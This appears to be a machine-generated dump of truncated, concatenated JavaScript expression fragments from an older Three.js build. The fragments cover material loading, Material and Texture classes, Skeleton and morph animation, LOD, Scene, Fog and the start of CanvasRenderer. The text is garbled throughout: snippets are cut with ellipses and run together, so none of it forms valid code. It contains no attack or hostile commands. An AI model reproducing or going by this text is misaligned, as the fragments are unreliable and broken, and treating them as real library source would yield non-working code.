]matJSON ... parID ]result. ... rID ] ]parID === "shading"matJSON ... hading;matJSON ... Shading( matJS ... Shading( matJS ... flat" )matJSON ...  "flat"flatparID === "side"matJSON ... double"doublematJSON ... leSide;matJSON ... bleSidematJSON ...  "back"matJSON ... ckSide;matJSON ... ackSidematJSON ... ntSide;matJSON ... ontSideparID === "blending"matJSON ... ending;matJSON ... lendingmatJSON ... n THREETHREE[  ... rID ] ]parID === "combine"matJSON ... ration;matJSON ... erationparID = ... Colors"matJSON ...  "face"matJSON ... Colors;matJSON ... eColorsmatJSON ... xColorsparID === "wrapRGB"var v3  ... arID ];v3 = ma ... parID ]matJSON ...  2 ] );matJSON ... [ 2 ] )new THR ... [ 2 ] )v3[ 0 ]v3[ 1 ]v3[ 2 ]matJSON ... y < 1.0matJSON ... definedmatJSON ... opacitymatJSON ... = true;matJSON ...  = truematJSON ... sparentmatJSON ... rmalMapvar dif ... .color;diffuse ... s.colormatJSON ... s.colorvar spe ... ecular;specula ... pecularmatJSON ... pecularvar amb ... mbient;ambient ... ambientmatJSON ... ambientvar shi ... niness;shinine ... ininessmatJSON ... ininessuniform ... lMap ];uniform ... alMap ]result. ... alMap ]matJSON ... alScaleuniform ...  1 ] );uniform ... [ 1 ] )matJSON ... le[ 0 ]matJSON ... le[ 1 ]matJSON ... ers.mapuniform ... ers.mapmatJSON ... .envMapuniform ... envMap;uniform ... .envMapuniforms[ "tCube" ]tCubeuniform ... tion" ]enableReflectionuniform ... tivity;uniform ... ctivityuniform ... vity" ]matJSON ... ctivitymatJSON ... ightMapmatJSON ... ularMapuniform ... rMap ];uniform ... arMap ]result. ... arMap ]matJSON ... mentMapuniform ... tMap ];uniform ... ntMap ]uniform ... ment" ]tDisplacementresult. ... ntMap ]enableDisplacementuniform ... ntBias;uniform ... entBiasuniform ... Bias" ]uDisplacementBiasmatJSON ... entBiasuniform ... tScale;uniform ... ntScaleuDisplacementScalematJSON ... ntScaleuniform ... fuse );uniform ... ffuse )materia ... ters );THREE[  ... .type ]matJSON.typemateria ...  matID;materia ... = matIDresult. ... terial;result. ... aterialresult. ... matID ]matJSON ... terialsvar mat ... y = [];materialArray = []matJSON ... .lengthvar lab ... s[ i ];label = ... ls[ i ]matJSON ... ls[ i ]materia ... el ] );materia ... bel ] )materialArray.pushresult. ... label ]result. ... lArray;result. ... alArrayresult. ... .cameradata.defaults.cameradata.defaultsresult. ... mera ];result. ... amera ]result.currentCameraresult. ... lts.fogdata.defaults.fogresult. ... .fog ];result. ... s.fog ]result.scene.fogscope.callbackSyncTHREE.T ... r;\r\n\r\n}THREE.TextureLoadervar tex ... mage );texture ... image )new THR ... image )if ( on ... \n\r\n\t\t\t}onLoad( texture );onLoad( texture )THREE.MaterialTHREE.M ... ount ++THREE.M ... IdCountthis.si ... ntSide;this.si ... ontSidethis.sidethis.opacity = 1;this.opacity = 1this.opacitythis.tr ...  false;this.tr ... = falsethis.transparentthis.bl ... ending;this.bl ... lendingthis.blendingthis.bl ... Factor;this.bl ... aFactorthis.blendSrcthis.blendDstthis.bl ... uation;this.bl ... quationthis.blendEquationthis.de ... = true;this.de ...  = truethis.depthTestthis.depthWritethis.po ...  false;this.po ... = falsethis.polygonOffsetthis.po ... or = 0;this.po ... tor = 0this.po ... tFactorthis.po ... ts = 0;this.po ... its = 0this.po ... etUnitsthis.alphaTest = 0;this.alphaTest = 0this.alphaTestthis.overdraw = 0;this.overdraw = 0this.overdrawthis.needsUpdateconstru ... aterialsetValu ... }\r\n\r\n\t}if ( va ... return;values === undefinedvar new ...  key ];newValu ... [ key ]values[ key ]if ( ne ... \n\r\n\t\t\t}newValu ... definedconsole ... ned.' )'THREE. ... fined.''THREE. ... ' + keyTHREE.Material: ''\' par ... fined.'' parameter is undefined.if ( ke ... \n\r\n\t\t\t}key in thisvar cur ...  key ];current ... [ key ]this[ key ]if ( cu ... \r\n\t\t\t\t}current ... E.Colorcurrent ... alue );current ... Value )currentValue.setcurrent ... Vector3newValu ... Vector3currentValue.copyif ( ke ... \r\n\t\t\t\t}key == 'overdraw'this[ k ... Value);this[ k ... wValue)Number(newValue)this[ k ... wValue;this[ k ... ewValueif ( ma ... rial();materia ... rial();materia ... erial()new THREE.Material()materia ... s.name;materia ... is.namemateria ... s.side;materia ... is.sidemateria ... endSrc;materia ... lendSrcmaterial.blendSrcmateria ... endDst;materia ... lendDstmaterial.blendDstmateria ... uation;materia ... quationmateria ... thTest;materia ... pthTestmaterial.depthTestmateria ... hWrite;materia ... thWritematerial.depthWritemateria ... Offset;materia ... nOffsetmateria ... Factor;materia ... tFactormateria ... tUnits;materia ... etUnitsmateria ... haTest;materia ... phaTestmaterial.alphaTestmateria ... erdraw;materia ... verdrawmaterial.overdrawmateria ... isible;materia ... visiblematerial.visibleTHREE.M ... nt = 0;THREE.M ... unt = 0THREE.L ... aterialTHREE.M ... this );THREE.M ...  this )THREE.Material.callthis.co ... ffff );this.co ... fffff )new THR ... fffff )this.linewidth = 1;this.linewidth = 1this.linewidththis.li ... round';this.li ... 'round'this.linecapthis.linejointhis.fog = true;this.fog = truethis.fogthis.se ... ters );this.se ... eters )this.setValuesTHREE.L ... l;\r\n\r\n}{\r\n\r\n\tv ... l;\r\n\r\n}var mat ... rial();new THR ... erial()THREE.M ... rial );THREE.M ... erial )THREE.M ... ne.callTHREE.M ... e.clonematerial.color.copymateria ... ewidth;materia ... newidthmaterial.linewidthmateria ... inecap;materia ... linecapmaterial.linecapmateria ... nejoin;materia ... inejoinmaterial.linejoinmateria ... is.fog;materia ... his.fogmaterial.fogthis.scale = 1;this.scale = 1this.dashSize = 3;this.dashSize = 3this.dashSizethis.gapSize = 1;this.gapSize = 1this.gapSizemateria ... .scale;materia ... s.scalematerial.scalemateria ... shSize;materia ... ashSizematerial.dashSizemateria ... apSize;materia ... gapSizematerial.gapSizeTHREE.M ... );\r\n\r\n}this.map = null;this.map = nullthis.mapthis.li ... = null;this.lightMap = nullthis.lightMapthis.sp ... = null;this.sp ...  = nullthis.specularMapthis.envMap = null;this.envMap = nullthis.envMapthis.co ... ration;this.co ... erationthis.combinethis.re ... ty = 1;this.re ... ity = 1this.reflectivitythis.re ... = 0.98;this.re ...  = 0.98this.refractionRatiothis.sh ... hading;this.sh ... Shadingthis.shadingthis.wireframethis.wi ... th = 1;this.wi ... dth = 1this.wi ... newidththis.wi ... round';this.wi ... 'round'this.wi ... Linecapthis.wi ... inejointhis.ve ... Colors;this.ve ... oColorsthis.sk ...  false;this.sk ... = falsethis.skinningthis.mo ...  false;this.mo ... = falseTHREE.M ... type );THREE.M ... otype )THREE.M ... l;\r\n\r\n}materia ... is.map;materia ... his.mapmaterial.mapmateria ... ghtMap;materia ... ightMapmaterial.lightMapmateria ... larMap;materia ... ularMapmaterial.specularMapmateria ... envMap;materia ... .envMapmaterial.envMapmateria ... ombine;materia ... combinematerial.combinemateria ... tivity;materia ... ctivitymateria ... nRatio;materia ... onRatiomateria ... hading;materia ... shadingmaterial.shadingmateria ... Linecapmateria ... inning;materia ... kinningmaterial.skinningmateria ... argets;this.am ... ffff );this.am ... fffff )this.ambientthis.em ... 0000 );this.em ... 00000 )this.emissivenew THR ... 00000 )this.wr ...  false;this.wr ... = falsethis.wrapAroundthis.wr ... 1, 1 );this.wr ...  1, 1 )this.wrapRGBmateria ... nt.copymateria ... ve.copymateria ... Around;materia ... pAroundmaterial.wrapAroundmateria ... pRGB );materia ... apRGB )materia ... GB.copymaterial.wrapRGBmateria ... ormals;this.sp ... 1111 );this.sp ... 11111 )this.specularnew THR ... 11111 )1118481this.shininess = 30;this.shininess = 30this.shininessthis.metal = false;this.metal = falsethis.metalthis.bumpMap = null;this.bumpMap = nullthis.bumpMapthis.bumpScale = 1;this.bumpScale = 1this.bumpScalethis.no ... = null;this.no ...  = nullthis.normalMapthis.no ... 1, 1 );this.no ...  1, 1 )this.normalScalemateria ... ar.copymateria ... .metal;materia ... s.metalmaterial.metalmateria ... umpMap;materia ... bumpMapmaterial.bumpMapmateria ... pScale;materia ... mpScalematerial.bumpScalemateria ... malMap;materia ... rmalMapmaterial.normalMapmateria ... cale );materia ... Scale )materia ... le.copymaterial.normalScaleTHREE.M ... ters );THREE.M ... eters )THREE.M ... ];\r\n\r\n}this.ma ... s : [];this.ma ... ls : []this.materialsmateria ... ls : []materia ... f Arraythis.ma ... .lengthmateria ... ne() );materia ... one() )this.ma ... clone()this.ma ... ].clonethis.materials[ i ]THREE.P ... aterialParticl ... aterialthis.size = 1;this.size = 1this.si ... = true;this.si ...  = truethis.sizeAttenuationTHREE.P ... l;\r\n\r\n}materia ... s.size;materia ... is.sizematerial.sizemateria ... nuationTHREE.P ... terial;this.fr ... () {}";this.fr ... n() {}"this.fragmentShadervoid main() {}this.ve ... () {}";this.ve ... n() {}"this.vertexShaderthis.uniforms = {};this.uniforms = {}this.defines = {};this.defines = {}this.definesthis.at ... = null;this.at ...  = nullthis.fog = false;this.fog = falsethis.lights = false;this.lights = falsethis.lightsthis.de ...  ]\r\n\t};this.de ... 0 ]\r\n\t}this.de ... eValuesdefault ... eValues{\r\n\t\t"c ... 0 ]\r\n\t}"color" ...  1, 1 ][ 1, 1, 1 ]"uv" : [ 0, 0 ][ 0, 0 ]"uv2" : [ 0, 0 ]this.in ... efined;this.in ... definedthis.in ... uteNamemateria ... Shader;materia ... tShadermateria ... xShadermateria ... orms );materia ... forms )material.uniformsmateria ... ibutes;materia ... ributesmaterial.attributesmateria ... efines;materia ... definesmaterial.definesmateria ... lights;materia ... .lightsmaterial.lightsTHREE.R ... aterialTHREE.S ... ters );THREE.S ... eters )THREE.S ... al.callTHREE.R ... type );THREE.R ... otype )THREE.R ... l;\r\n\r\n}THREE.R ... e.cloneTHREE.S ... rial );THREE.S ... erial )THREE.S ... ne.callTHREE.SpriteMaterialthis.rotation = 0;this.rotation = 0materia ... tation;materia ... otationmaterial.rotationTHREE.S ... aterialthis.pr ... r ) {};this.pr ... or ) {}this.programfunctio ... or ) {}materia ... rogram;materia ... programmaterial.programTHREE.T ... l;\r\n\r\n}THREE.T ... ount ++THREE.TextureIdCountthis.image = image;this.image = imagethis.imagethis.mipmaps = [];this.mipmaps = []this.mipmapsthis.ma ... ping();this.ma ... pping()this.mappingmapping ... pping()mapping ... definednew THR ... pping()this.wr ... apping;this.wr ... rappingthis.wrapSwrapS ! ... rappingwrapS !== undefinedthis.wrapTwrapT ! ... rappingwrapT !== undefinedthis.ma ... Filter;this.ma ... rFilterthis.magFiltermagFilt ... definedthis.mi ... Filter;this.mi ... rFilterthis.minFilterminFilt ... definedthis.an ... py : 1;this.an ... opy : 1this.anisotropyanisotr ... opy : 1anisotr ... definedthis.fo ... Format;this.fo ... AFormatformat  ... AFormatformat !== undefinedthis.ty ... teType;this.ty ... yteTypethis.typetype != ... yteTypetype !== undefinedthis.of ... 0, 0 );this.of ...  0, 0 )this.offsetthis.re ... 1, 1 );this.re ...  1, 1 )this.repeatthis.ge ... = true;this.ge ...  = truethis.generateMipmapsthis.pr ...  false;this.pr ... = falsethis.pr ... lyAlphathis.flipY = true;this.flipY = truethis.flipYthis.un ... nt = 4;this.un ... ent = 4this.unpackAlignmentthis._n ...  false;this._n ... = falsethis._needsUpdatethis.on ... = null;this.onUpdate = nullthis.onUpdateconstru ... Textureget nee ... ;\r\n\r\n\t}return  ... Update;set nee ... ;\r\n\r\n\t}if ( va ... date();value === truethis.update();this.update()this._n ...  value;this._n ... = valueif ( te ... ture();texture ... ture();texture ... xture()new THREE.Texture()texture ... .image;texture ... s.imagetexture ... ice(0);texture ... lice(0)texture.mipmapsthis.mi ... lice(0)this.mipmaps.slicetexture ... mappingtexture.mappingtexture ... .wrapS;texture ... s.wrapStexture ... .wrapT;texture ... s.wrapTtexture ... Filter;texture ... format;texture ... .formattexture.formattexture ... s.type;texture ... is.typetexture.typetexture ... fset );texture ... ffset )texture.offset.copytexture ... peat );texture ... epeat )texture.repeat.copytexture ... ipmaps;texture ... Mipmapstexture ... yAlpha;texture ... lyAlphatexture ... .flipY;texture ... s.flipYtexture.flipYtexture ... gnment;texture ... ignmentreturn texture;update: ... ;\r\n\r\n\t}this.di ... te' } ){ type: 'update' }type: 'update'THREE.T ... nt = 0;THREE.T ... unt = 0THREE.C ... e\r\n\r\n};THREE.C ... le\r\n\r\n}THREE.C ... Texturefunctio ... le\r\n\r\n}{\r\n\r\n\tT ... le\r\n\r\n}THREE.T ... ropy );THREE.T ... tropy )THREE.Texture.callthis.im ... ight };this.im ... eight }{ width ... eight }width: widthheight: heightthis.mi ... ipmaps;this.mi ... mipmapsthis.ge ...  false;this.ge ... = false{\r\n\r\n\tv ... e;\r\n\r\n}var tex ... ture();new THR ... xture()THREE.T ... ture );THREE.T ... xture )THREE.T ... ne.callTHREE.T ... e.cloneTHREE.D ... };\r\n\r\n}THREE.DataTexture{ data: ... eight }data: dataTHREE.D ... e;\r\n\r\n}THREE.P ... e;\r\n\r\n}THREE.ParticleSystemthis.ge ... etry();this.ge ... metry()this.geometrythis.ma ... ff } );this.ma ... fff } )materia ... fff } )new THR ... fff } ){ color ... fffff }color:  ... xffffffMath.ra ... xffffffthis.so ...  false;this.sortParticlesthis.fr ...  false;this.fr ... = falseif ( ob ... rial );object. ... ticles;object. ... rticlesobject.sortParticlesTHREE.O ... ject );THREE.O ... bject )THREE.L ... p;\r\n\r\n}functio ... p;\r\n\r\n}{\r\n\r\n\tT ... p;\r\n\r\n}this.ty ... eStrip;this.ty ... neStrip( type  ... neStrip( type  ... fined )THREE.LineStrip = 0;THREE.LineStrip = 0THREE.L ... es = 1;THREE.LinePieces = 1THREE.Line.prototypeif ( ob ... type );object  ... type );object  ... .type )new THR ... .type )this.up ... gets();this.up ... rgets()this.up ... TargetsTHREE.Mesh.prototypeTHREE.M ... Targetsif ( th ... }\r\n\r\n\t}this.ge ... gth > 0this.ge ... definedthis.ge ... Targetsthis.ge ... .lengththis.mo ... e = -1;this.mo ... se = -1this.morphTargetBasethis.mo ... r = [];this.mo ... er = []this.mo ... edOrdermorphTa ... edOrderthis.mo ... es = []this.mo ... luencesthis.mo ... y = {};this.mo ... ry = {}this.mo ... tionarymorphTa ... tionarym < mlm ++var m = ... .lengthm = 0ml = th ... .lengththis.mo ... h( 0 );this.mo ... sh( 0 )this.mo ... es.pushthis.mo ...  ] = m;this.mo ... e ] = mthis.mo ... .name ]this.ge ...  ].namethis.ge ... ts[ m ]THREE.M ... 0;\r\n\r\n}THREE.M ... xByNamegetMorp ... xByName{\r\n\r\n\ti ... 0;\r\n\r\n}this.mo ... definedthis.mo ...  name ]console ...  0." );console ... g 0." )"THREE. ... ing 0.""THREE. ...  + name"THREE. ... arget "THREE.Mesh.getMorphTargetIndexByName: morph target " does  ... ing 0." does not exist. Returning 0.THREE.M ... t;\r\n\r\n}THREE.O ... sive );THREE.O ... rsive )THREE.B ... 0;\r\n\r\n}THREE.Bonethis.sk ... ToSkin;this.sk ... sToSkinthis.skinthis.sk ... rix4();this.sk ... trix4()this.skinMatrixthis.ac ... ht = 0;this.ac ... ght = 0this.ac ... tWeightthis.ac ... sWeightthis.ac ... lWeightTHREE.B ... type );THREE.B ... otype )THREE.Bone.prototypeTHREE.B ... .update{\r\n\r\n\t/ ... \t}\r\n\r\n}forceUp ... trix();forceUp ... atrix()if ( fo ... ;\r\n\r\n\t}forceUp ... sUpdateif ( pa ... \r\n\r\n\t\t}this.sk ... trix );this.sk ... atrix )this.sk ... atricesthis.skinMatrix.copyforceUpdate = true;forceUpdate = truethis.ch ... date );this.ch ... pdate )this.ch ... .updateTHREE.Skeleton{\r\n\r\n\tt ... \t}\r\n\r\n}this.us ... : true;this.us ...  : truethis.us ... TextureuseVert ...  : trueuseVert ... definedthis.bones = [];this.bones = []this.bonesthis.bo ... s = [];this.bo ... es = []this.boneMatricesvar bon ... , q, s;if ( bo ... }\r\n\r\n\t}boneLis ... definedb < boneList.lengthboneList.length++bvar b = 0b = 0gbone = ... t[ b ];gbone = ... st[ b ]boneList[ b ]p = gbone.pos;p = gbone.posgbone.posq = gbone.rotq;q = gbone.rotqgbone.rotqs = gbone.scl;s = gbone.sclgbone.sclbone =  ... Bone();bone =  ... dBone()this.addBone()this.addBonebone.na ... e.name;bone.na ... ne.namebone.namegbone.namebone.po ... p[2] );bone.po ...  p[2] )bone.position.setbone.positionp[0]p[1]p[2]bone.qu ... q[3] );bone.qu ...  q[3] )bone.quaternion.setbone.quaternionq[0]q[1]q[2]q[3]if ( s  ... \n\r\n\t\t\t}s !== undefinedbone.sc ... s[2] );bone.sc ...  s[2] )bone.scale.setbone.scales[0]s[1]s[2]bone.sc ... 1, 1 );bone.sc ...  1, 1 )if ( gb ... \n\r\n\t\t\t}gbone.parent !== -1gbone.parentthis.bo ...  b ] );this.bo ... [ b ] )this.bo ... t ].addthis.bo ... arent ]this.bones[ b ]var nBo ... length;nBones  ... .lengththis.bones.lengthvar size;if ( nB ... ze = 8;nBones > 256size = 64;size = 64nBones > 64size = 32;size = 32nBones > 16size = 16;size = 16size = 8;size = 8this.bo ... = size;this.bo ...  = sizethis.bo ... reWidththis.bo ... eHeightthis.bo ...  * 4 );this.bo ... t * 4 )new Flo ... t * 4 )this.bo ... ght * 4this.bo ... Type );this.bo ... tType )this.boneTexturenew THR ... tType )this.bo ... Filter;this.bo ... tFilterthis.bo ... nFilterthis.bo ... gFilterthis.bo ...  false;this.bo ... = falsethis.bo ... Mipmapsthis.bo ... e.flipYthis.bo ... ones );this.bo ... Bones )new Flo ... Bones )16 * nBonesTHREE.S ... addBone{\r\n\r\n\ti ... e;\r\n\r\n}if ( bo ... ;\r\n\r\n\t}bone === undefinedbone =  ... this );bone =  ...  this )this.bo ... bone );this.bo ...  bone )this.bones.pushreturn bone;THREE.S ... nversesthis.boneInversesb < blvar b = ... .lengthbl = th ... .lengthinverse ... trix );inverse ... atrix )inverse.getInversethis.bo ... nMatrixthis.bo ... erse );this.bo ... verse )this.bo ... es.pushTHREE.Mesh.callthis.sk ... ture );this.sk ... xture )this.skeletonthis.ge ... y.bonesthis.geometry.bonesfor ( v ... }\r\n\r\n\t}b < thi ... .lengththis.sk ... .lengththis.skeleton.bonesvar bon ... s[ b ];bone =  ... es[ b ]this.sk ... es[ b ]bone.pa ... definedbone.parentthis.add( bone );this.add( bone )this.addthis.id ... rix4();this.id ... trix4()this.identityMatrixthis.pose();this.pose()this.poseTHREE.S ... \n\r\n}();THREE.S ... \r\n\r\n}()THREE.S ... ixWorldvar off ... rix4();offsetM ... trix4()this.ma ... trix();this.ma ... atrix()this.ma ... | forcechild i ... EE.Bonechild.u ... alse );child.u ... false )child.updatechild.u ... true );child.u ...  true )child.u ... ixWorldthis.sk ... definedthis.sk ... nversesthis.sk ... rses();this.sk ... erses()b ++offsetM ...  b ] );offsetM ... [ b ] )offsetM ... atricesthis.sk ... nMatrixoffsetM ... * 16 );offsetM ...  * 16 )offsetM ... yOffsetb * 16this.sk ... Texturethis.sk ... = true;this.sk ...  = truethis.sk ... sUpdateTHREE.S ... pe.posethis.up ... true );this.up ...  true )this.up ... ixWorldthis.no ... ghts();this.no ... ights()this.no ... WeightsTHREE.S ... Weightsif ( th ... y\r\n\r\n\t}this.ge ... eometrythis.ge ... Indicesvar sw  ... s[ i ];sw = th ... ts[ i ]this.ge ... ts[ i ]this.ge ... Weightsvar sca ... ttan();scale = ... attan()1.0 / s ... attan()sw.lengthManhattan()sw.lengthManhattanscale !== Infinitysw.mult ... cale );sw.mult ... scale )sw.multiplyScalarsw.set( 1 );sw.set( 1 )sw.setif ( ob ... ;\r\n\r\n\t}object  ... ture );object  ... xture )THREE.M ... ject );THREE.M ... bject )this.du ... = 1000;this.duration = 1000this.durationthis.mi ...  false;this.mirroredLoopthis.time = 0;this.time = 0this.timethis.la ... me = 0;this.la ... ame = 0this.lastKeyframethis.cu ... me = 0;this.cu ... ame = 0this.currentKeyframethis.direction = 1;this.direction = 1this.di ...  false;this.di ... = falsethis.di ... ckwardsthis.se ...  - 1 );this.se ... h - 1 )this.setFrameRangethis.ge ... gth - 1THREE.M ... meRangethis.st ...  start;this.st ... = startthis.startKeyframethis.en ...  = end;this.en ... e = endthis.endKeyframethis.le ... me + 1;this.le ... ame + 1this.en ... ame + 1this.en ... eyframeTHREE.M ... ForwardTHREE.M ... ackwardthis.direction = -1;this.direction = -1this.di ... = true;THREE.M ... n;\r\n\r\n}THREE.M ... mationsfunctio ... n;\r\n\r\n}{\r\n\r\n\tv ... n;\r\n\r\n}if ( !  ... s = {};! geome ... mationsgeometr ... s = {};geometr ... ns = {}var fir ... ations;animati ... mationsvar pat ... (\d+)/;pattern ... ?(\d+)/([a-z]+)_?(\d+)([a-z]+)[a-z]+_?il = ge ... .lengthmorph = ... ts[ i ]var par ... tern );parts = ... ttern )morph.n ... ttern )morph.name.matchmorph.nameparts & ... gth > 1parts.length > 1var lab ... s[ 1 ];label = parts[ 1 ]parts[ 1 ]var num ... s[ 2 ];num = parts[ 2 ]parts[ 2 ]if ( !  ... nity };! anima ... label ]animations[ label ]animati ... nity };animati ... inity }{ start ... inity }start: Infinityend: -Infinityvar ani ... abel ];animati ... label ]if ( i  ... rt = i;i < animation.startanimation.startanimation.start = i;animation.start = iif ( i  ... nd = i;i > animation.endanimation.endanimation.end = i;animation.end = iif ( !  ...  label;! firstAnimationfirstAn ...  label;firstAn ... = labelTHREE.M ... };\r\n\r\n}THREE.M ... onLabel{\r\n\r\n\ti ... };\r\n\r\n}! this. ... mationsthis.ge ... mationsthis.ge ... ns = {}this.ge ...  end };this.ge ... : end }this.ge ... label ]{ start ... : end }end: endTHREE.M ... imationif ( an ... ;\r\n\r\n\t}this.se ... .end );this.se ... n.end )this.du ...  fps );this.du ... / fps )1000 *  ... / fps )( ( ani ... / fps )( anima ... ) / fps( anima ... start )animati ... n.startconsole ... ned" );console ... ined" )"animat ... efined""animation[" + labelanimation[] undefinedTHREE.M ... x;\r\n\r\n}functio ... x;\r\n\r\n}{\r\n\r\n\tv ... x;\r\n\r\n}var fra ... length;frameTi ... .lengththis.du ... .lengththis.ti ...  delta;this.ti ... * deltathis.di ... * deltathis.ti ... ime < 0this.ti ... urationthis.time < 0this.di ...  *= -1;this.direction *= -1this.ti ... ration;if ( th ... ration;var key ...  - 1 );keyfram ... h - 1 )this.st ... h - 1 )THREE.M ... h - 1 )Math.fl ... eTime )this.ti ... ameTimethis.length - 1if ( ke ... ;\r\n\r\n\t}keyfram ... eyframethis.mo ...  ] = 0;this.mo ... e ] = 0this.mo ... frame ]this.mo ...  ] = 1;this.mo ... e ] = 1this.la ... yframe;this.la ... eyframethis.cu ... yframe;this.cu ... eyframevar mix ... meTime;mix = ( ... ameTime( this. ... ameTime( this. ... eTime )mix = 1 - mix;mix = 1 - mix1 - mixthis.mo ...  = mix;this.mo ... ] = mixthis.mo ...  - mix;this.mo ... 1 - mixobject. ... s.time;object. ... is.timeobject. ... yframe;object. ... eyframeobject.lastKeyframeobject. ... ection;object. ... rectionobject.directionobject. ... kwards;object. ... ckwardsTHREE.L ... ];\r\n\r\n}{\r\n\r\n\tT ... ];\r\n\r\n}this.objects = [];this.objects = []this.objectsTHREE.LOD.prototypeTHREE.L ... ddLevelif ( di ... ce = 0;distance = 0;distance = 0distanc ... ance );distanc ... tance )Math.abs( distance )l < thi ... .lengththis.objects.lengthl ++var l = 0l = 0this.ob ... istancethis.objects[ l ]this.ob ... ct } );this.ob ... ect } )this.objects.splice{ dista ... bject }this.add( object );this.add( object )THREE.L ... istance{\r\n\r\n\tf ... t;\r\n\r\n}this.objects[ i ]return  ... object;this.ob ... .objectthis.ob ... i - 1 ]THREE.L ... \n\r\n}();THREE.L ... \r\n\r\n}()THREE.L ... .updatethis.ob ... gth > 1v1.setF ... orld );v1.setF ... World )v1.setF ... ositionv2.setF ... orld );v2.setF ... World )v2.setF ... ositionvar dis ... ( v2 );distanc ... o( v2 )v1.distanceTo( v2 )this.ob ... = true;this.ob ...  = truethis.ob ... visiblethis.objects[ 0 ]if ( di ... \r\n\t\t\t\t}this.ob ...  false;this.ob ... = falsethis.ob ... i     ]for( ;  ... \n\r\n\t\t\t}if ( ob ... .LOD();object  ... .LOD();object  ... E.LOD()new THREE.LOD()for ( v ...  );\r\n\t}{\r\n\t\tva ...  );\r\n\t}var x = ... lone();x = thi ... clone()this.ob ... clone()this.ob ... t.clonethis.objects[i]x.visible = i === 0;x.visible = i === 0x.visiblei === 0object. ... ance );object.addLevelTHREE.S ... \n} )();THREE.S ... \r\n} )()( funct ... \r\n} )()( funct ... \r\n\r\n} )var ver ... 3, 3 );vertice ...  3, 3 )new THR ...  3, 3 )vertice ...  0 ] );vertice ... , 0 ] )vertices.set[ - 0.5 ... .5, 0 ]- 0.5geometr ... ices );geometr ... tices )this.ge ... ometry;this.ma ... rial();this.ma ... erial()( mater ... erial()( mater ... fined )THREE.S ... eMatrixTHREE.P ... Sprite;THREE.P ... .SpriteTHREE.ParticleTHREE.S ... ];\r\n\r\n}this.fog = null;this.fog = nullthis.ov ... = null;this.ov ...  = nullthis.au ... = true;this.au ...  = truethis.autoUpdatethis.__lights = [];this.__lights = []this.__lightsthis.__ ... d = [];this.__ ... ed = []this.__objectsAddedthis.__ ... RemovedTHREE.S ... dObjectif ( ob ... }\r\n\r\n\t}this.__ ... === - 1this.__ ... bject )this.__ ... indexOfthis.__ ... ject );this.__lights.pushobject.targetobject.target.parentthis.ad ... rget );this.ad ... arget )if ( !( ... }\r\n\r\n\t}!( obje ... .Bone )( objec ... .Bone )object  ... EE.Boneobject  ... .Camerathis.__ ... ed.pushvar i = ... ject );i = thi ... bject )if ( i  ... \r\n\r\n\t\t}i !== -1this.__ ... i, 1 );this.__ ...  i, 1 )this.__ ... .splicethis.di ... ct } );this.di ... ect } ){ type: ... bject }type: 'objectAdded'objectAddedobject. ... is } );object. ... his } ){ type: ...  this }type: 'addedToScene'addedToScenescene: thisc < obj ... .lengthc ++var c = 0this.__ ...  c ] );this.__ ... [ c ] )this.__addObjectobject.children[ c ]THREE.S ... eObjectthis.__lights.spliceobject. ... deArrayx < obj ... .lengthx ++this.__ ...  x ] );this.__ ... [ x ] )this.__removeObjectobject. ... ay[ x ]!( obje ... amera )( objec ... amera )type: ' ... emoved'objectRemovedtype: ' ... mScene'removedFromSceneif ( ob ... cene();THREE.O ... bject);THREE.O ... object)if ( th ... lone();this.fog !== nullobject. ... lone();object. ... clone()object.fogthis.fog.clone()this.fog.clonethis.ov ... == nullthis.ov ... clone()this.ov ... l.cloneobject.autoUpdatethis.ne ... ar : 1;this.ne ... ear : 1( near  ... ear : 1this.fa ... : 1000;this.fa ...  : 1000( far ! ...  : 1000THREE.F ... e.cloneTHREE.Fog.prototypereturn  ... .far );new THR ... s.far )this.color.getHex()this.color.getHexTHREE.F ... 5;\r\n\r\n}functio ... 5;\r\n\r\n}{\r\n\r\n\tt ... 5;\r\n\r\n}this.de ... .00025;this.de ... 0.00025this.density( densi ... 0.00025( densi ... fined )density ... defined2.5E-4return  ... sity );THREE.CanvasRendererconsole ... SION );console ... ISION )'THREE. ... nderer'THREE.REVISIONvar smo ... thstep;smooths ... othstepTHREE.M ... othstepparamet ...  || {};paramet ... s || {}parameters || {}var _th ... rix3();_this = this_projec ... ector()new THR ... ector()_canvas ... nvas' )paramet ... nvas' )paramet ... definedparameters.canvas_canvas ... s.width_canvas.width_canvas ... .height_canvas.height_canvas ... h / 2 )Math.fl ... h / 2 )_canvasWidth / 2_canvas ... t / 2 )Math.fl ... t / 2 )_canvasHeight / 2_contex ... e\r\n\t} )_canvas ... e\r\n\t} )_canvas.getContext{\r\n\t\tal ... rue\r\n\t}alpha:  ... == trueparamet ... == trueparameters.alpha_clearC ... 00000 )_clearAlpha = 0_contex ... pha = 1_contex ... ion = 0_contex ... eration_contex ...  = null_contextGapSize = 0_v5 = n ... ertex()_v6 = n ... ertex()_color  ... Color()_color1 ... Color()_color2 ... Color()_color3 ... Color()_color4 ... Color()_diffus ... Color()_emissi ... Color()_lightC ... Color()_patterns = {}_clipBo ... .Box2()_clearB ... .Box2()_elemBo ... .Box2()_ambien ... Color()_direct ... Color()_pointL ... Color()_centro ... ctor3()_normal ... ctor3()if ( _c ... }\r\n\r\n\t}_contex ... defined_context.setLineDash_contex ... n () {}this.do ... canvas;this.do ... _canvasthis.de ... \t\t\t: 1;this.de ... \t\t\t\t: 1this.de ... elRatioparamet ... \t\t\t\t: 1paramet ... elRatioself.de ... \t\t\t\t: 1self.de ... definedself.de ... elRatiothis.autoClearthis.so ... = true;this.sortObjectsthis.sortElementsthis.inforender: ... \r\n\r\n\t\t}vertices: 0faces: 0this.su ...  () {};this.su ... n () {}this.su ... exturessupport ... exturesthis.se ...  () {};this.se ... n () {}this.setFaceCullingthis.se ... \r\n\r\n\t};this.se ... ;\r\n\r\n\t}this.setSize_canvas ... lRatio;_canvas ... elRatiowidth * ... elRatioheight  ... elRatio_canvas ... sWidth;_canvas ... asWidth_canvas ... Height;_canvas ... sHeight_canvas ...  / 2 );if ( up ... \r\n\r\n\t\t}updateS ... = false_canvas ... + 'px';_canvas ...  + 'px'_canvas.style.width_canvas.stylewidth + 'px'_canvas.style.heightheight + 'px'_clipBo ... Half );_clipBo ... tHalf )_clipBox.min.set_clipBox.min- _canvasWidthHalf- _canvasHeightHalf_clipBox.max.set_clipBox.max_clearB ... Half );_clearB ... tHalf )_clearBox.min.set_clearBox.min_clearBox.max.set_clearBox.max_contex ... ha = 1;_contex ... on = 0;_contex ... = null;this.se ... ight );this.se ... eight )this.setViewportvar vie ... lRatio;viewpor ... elRatiox * thi ... elRatioy * thi ... elRatio_contex ... ortY );_contex ... portY )_contex ... ansformviewpor ... 